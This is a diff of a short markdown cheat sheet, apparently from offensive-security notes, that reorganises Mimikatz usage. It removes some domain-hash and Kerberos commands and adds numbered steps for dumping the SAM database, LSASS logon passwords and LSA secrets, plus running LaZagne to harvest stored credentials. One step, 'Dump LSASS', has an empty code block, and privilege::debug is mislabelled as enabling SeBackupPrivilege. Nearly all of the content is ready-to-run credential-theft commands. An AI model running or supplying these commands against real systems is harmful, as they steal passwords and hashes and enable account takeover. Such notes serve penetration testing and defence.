@@ -1,36 +1,40 @@
 
 ## Mimikatz
 
+1. Activate SeBackupPrivilege
+
 ```
 privilege::debug
 ```
-##### Logon-Sessions
 
-```
-sekurlsa::logonpasswords
-```
-
-```
-sekurlsa::ekeys
-sekurlsa::krbtgt
-sekurlsa::dpapi
-```
-##### SAM
+2. Dump SAM
 
 ```
 lsadump::sam
 ```
 
-##### Specific SAM & SYSTEM Files
+3. Dump LSASS
 
 ```
-lsadump::sam /sam:C:Temp\SAM /system:C:\Temp\SYSTEM
-```
-
-##### Domain Hashes
 
 ```
-lsadump::dcsync /all /csv
+
+4. Dump Logonpasswords
+
+```
+sekurlsa::logonpasswords
+```
+
+5. Dump secrets
+
+```
+lsadump::secrets
+```
+
+6. Use LaZagne.exe
+
+```
+./LaZagne.exe all
 ```
 
 ---
